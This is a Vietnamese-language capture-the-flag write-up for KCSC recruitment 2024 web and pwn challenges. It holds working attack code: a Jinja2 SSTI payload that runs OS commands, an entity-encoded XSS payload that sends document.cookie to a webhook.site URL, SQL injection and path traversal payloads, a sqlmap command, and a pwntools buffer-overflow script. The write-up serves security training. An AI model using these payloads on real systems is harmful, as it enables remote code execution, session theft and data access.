# kcsc recruitment 2024

## now you see me

### Phân tích 

- thấy response trả về có chứa nội dung mà người dùng nhập vào trong param user

==> thử payload SSTI

![image](https://hackmd.io/_uploads/SySb7hmTA.png)

==> lỗi ssti thử với {{7*'7'}} ra 7777777 và thấy response server trả về là python ==> jinja2 


![image](https://hackmd.io/_uploads/rkkCgxB6R.png)

![image](https://hackmd.io/_uploads/rJ1yWlBTR.png)

![image](https://hackmd.io/_uploads/H1EhbxBTC.png)

### Khai thác

- https://www.paloaltonetworks.com/blog/prisma-cloud/template-injection-vulnerabilities/

- Vì mọi thứ đều là đối tượng trong Python, nên một đoạn mã như “{{''.__class__}}” sẽ hiển thị lớp '', tức là “str”.
- Method Resolution Order (__mro__), thuộc tính này sẽ trả về một bộ các kế thừa và kiểu mà lớp hiện tại được kế thừa.
- lấy các lớp kế thừa lớp “object” bằng phương thức “__subclasses__” : tiết lộ một danh sách lớn các lớp có thể được sử dụng để tìm mô-đun mà chúng ta đang tìm kiếm
-  sử dụng phương thức “__init__” để tham chiếu đến hàm tạo lớp và sử dụng thêm phương thức “__globals__” để lấy các biến toàn cục của hàm trong khi tìm kiếm một mô-đun cho phép chúng ta thực thi các lệnh trên OS, chúng ta có thể tìm mô-đun “sys”
- thấy có modun sys
![image](https://hackmd.io/_uploads/SJAwHeH60.png)

- dùng đoạn code python sau để tìm modun ```sys```

```python
import requests

counter = 0
while True:
    payload = """{{ ''.__class__.__mro__[1].__subclasses__()[%s].__init__.__globals__['sys'] }}""" % counter
    url = 'http://157.15.86.73:3004/register'
    r = requests.post(url, data={"user": payload})
    
    if "Welcome " in r.text:
        print(r.text)
        print(counter)
        break
    
    counter += 1
```

![image](https://hackmd.io/_uploads/rk7Zlp76C.png)

 phát hiện ra rằng lớp con ở chỉ mục 114 là lớp đầu tiên có mô-đun “sys” trong các biến toàn cục của nó.

- dùng payload sau để đọc flag

```
{{+''.__class__.__mro__[1].__subclasses__()[114].__init__.__globals__['sys'].modules['os'].popen("cat+/flag.txt").read()+}}
```

![image](https://hackmd.io/_uploads/BJ9eeamp0.png)

## x ec ec

### Phân tích
- đoạn code js xóa các chuỗi "script", "on", "javascript:" ==> encode "script", "on", "javascript:" mà trình duyệt vẫn hiểu để render


![image](https://hackmd.io/_uploads/BJEmR_VaR.png)


- encode sang HTML entity

![image](https://hackmd.io/_uploads/ByPAwxSTC.png)

- thử payload sau và thành công trigger 
```!
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(2)">a</a>
```

![image](https://hackmd.io/_uploads/Bk5dMA76A.png)

- nhưng nó cần click vào để trigger ==> cần 1 thẻ khác không cần click vào mà vẫn trigger được

### Khai thác

- dùng payload sau 

```
<iframe src="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:fetch(`https://webhook.site/12b35fc3-dd67-4e4e-a9fc-42cc53d2fff5?a=${document.cookie}`)"></iframe>
```


![image](https://hackmd.io/_uploads/SynYDCQpR.png)

- khi admin truy cập sẽ gửi request kèm cookie đến webhook của attcker

![image](https://hackmd.io/_uploads/H1ImwRmpR.png)




```
<image src="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:fetch(`https://webhook.site/12b35fc3-dd67-4e4e-a9fc-42cc53d2fff5?a=${document.cookie}`)">
```



## KCSC x Jujutsu Kaisen

### Phân tích
- chương trình lấy username từ param username và lấy giá trị đầu trước dấu "." và cho vào câu query

![image](https://hackmd.io/_uploads/Hymka_ETA.png)

- vậy có thể khai thác sql injection với ```.jpg``` ở cuối

![image](https://hackmd.io/_uploads/ByYm6NVp0.png)

```sql
'+UNION+SELECT+table_name+FROM+information_schema.tables+--+-.jpg
```

### Khai thác
- cần đọc hàm decrypt 
- payload đọc các hàm trong database như sau

```sql
SELECT  routine_name FROM information_schema.routines WHERE routine_schema = "jujutsu_kaisen" 
```

- https://soft-builder.com/how-to-list-stored-procedures-and-functions-in-mysql-database/#:~:text=If%20you%20are%20using%20the,db%20%3D%20'your_database_name'%3B%20command.&text=Listing%20all%20functions%20in%20a,db%20%3D%20'your_database_name'%3B%20command.

![image](https://hackmd.io/_uploads/rJ8YCE46R.png)

lấy được tên hàm DECRYPT: 

- DECRYPT_DIALOGUE_xckQopBS4HrTe8b9<br>
ENC_DIALOGUE_KR1ebf2RDPIU4dN

cần key giải mã thuật toán mã hóa đối xứng AES

- dùng sqlmap tìm 1 loạt các bảng không thấy key 

```sql
 sqlmap -u "http://157.15.86.73:3002/?username='*-- -.jpg" --batch --threads=10  --risk=3 --level=5   --dbms=MySQL --technique="U" -T users --dump 
```
 
- để ý trong source code có biến key_decrypt ở file index.php ===> cần được file này trên server để lấy key


![image](https://hackmd.io/_uploads/SJwA9uN6C.png)




![image](https://hackmd.io/_uploads/Hymka_ETA.png)

- thấy từ input của người dùng ở param username được validate bằng tay và cho vào hàm file_get_contents để đọc file trong thư mục image==> có thể khai thác path traversal ở đây


![image](https://hackmd.io/_uploads/HkwAclraA.png)


từ thư muc image ra ngoài 1 cấp là đến src chứa index.php
- đoạn code validate chỉ loại bỏ "./" trong đường dẫn
- path traversal ```...//index.php``` đọc được source index.php có key_decrypt
 
 
 ![image](https://hackmd.io/_uploads/rkGiYuNaC.png)



 
 ![image](https://hackmd.io/_uploads/r1SuOuNTC.png)


 key: ```$up3r_$3cr3t_4_$3cur3```
 
 - gọi hàm decrypt với key decrypt và đọc được flag
```sql
'+UNION+SELECT+CONVERT(DECRYPT_DIALOGUE_xckQopBS4HrTe8b9(dialogue,+'$up3r_$3cr3t_4_$3cur3')+USING+utf8)+AS+decrypted_dialogue+FROM+users+WHERE+username+%3d+'toge'+--+-.jpg 
```
![image](https://hackmd.io/_uploads/SycqOdNp0.png)

## Base64

```python
b64 = {
    "000000": "/",
    "000001": "+",
    "000010": "0",
    "000011": "1",
    "000100": "2",
    "000101": "3",
    "000110": "4",
    "000111": "5",
    "001000": "6",
    "001001": "7",
    "001010": "8",
    "001011": "9",
    "001100": "a",
    "001101": "b",
    "001110": "c",
    "001111": "d",
    "010000": "e",
    "010001": "f",
    "010010": "g",
    "010011": "h",
    "010100": "i",
    "010101": "j",
    "010110": "k",
    "010111": "l",
    "011000": "m",
    "011001": "n",
    "011010": "o",
    "011011": "p",
    "011100": "q",
    "011101": "r",
    "011110": "s",
    "011111": "t",
    "100000": "u",
    "100001": "v",
    "100010": "w",
    "100011": "x",
    "100100": "y",
    "100101": "z",
    "100110": "A",
    "100111": "B",
    "101000": "C",
    "101001": "D",
    "101010": "E",
    "101011": "F",
    "101100": "G",
    "101101": "H",
    "101110": "I",
    "101111": "J",
    "110000": "K",
    "110001": "L",
    "110010": "M",
    "110011": "N",
    "110100": "O",
    "110101": "P",
    "110110": "Q",
    "110111": "R",
    "111000": "S",
    "111001": "T",
    "111010": "U",
    "111011": "V",
    "111100": "W",
    "111101": "X",
    "111110": "Y",
    "111111": "Z",
}

# Tạo bảng đảo ngược
reverse_b64 = {v: k for k, v in b64.items()}

def decode(encoded):
    # Loại bỏ padding nếu có
    pad = encoded.count('=')
    if pad > 0:
        encoded = encoded[:-pad]
    
    # Chuyển từng ký tự thành chuỗi nhị phân dựa trên bảng đảo ngược
    binary_str = ""
    for char in encoded:
        binary_str += reverse_b64[char]
    
    # Loại bỏ các bit padding đã thêm lúc encode
    if pad == 1:
        binary_str = binary_str[:-2]
    elif pad == 2:
        binary_str = binary_str[:-4]
    
    # Chuyển chuỗi nhị phân thành ký tự ASCII
    decoded = ""
    for i in range(0, len(binary_str), 8):
        decoded += chr(int(binary_str[i:i+8], 2))
    
    return decoded

# Chuỗi mã hóa cần giải
encoded_flag = "gObheRHIpN+wlQ7vqQiQb3XzpAbJn4iv6lR="
print(decode(encoded_flag))
# KCSC{no0b_base64_encode!!}
```
## basic bof

- thấy đây là file chạy 64 bit

![image](https://hackmd.io/_uploads/r1WgfK4TR.png)

- thấy đoạn code dùng hàm gets để đọc giá trị và có hàm win chứa shell

![image](https://hackmd.io/_uploads/BkfqnerpR.png)

==> buffer overflow và ghi đè giá trị trả về là địa chỉ hàm win để lấy shell


```python
#!/usr/bin/python3.7
from pwn import *

p = remote('157.15.86.73', 8005) 
elf = ELF('./chal1') 

win_addr = elf.symbols['win'] + 5

payload = b'A' * 0x100   
payload += b'B' * 8       # Overwrite saved RBP (not critical)
payload += p64(win_addr)  

p.sendline(payload)

p.interactive()

```

![image](https://hackmd.io/_uploads/HJ-55KEa0.png)
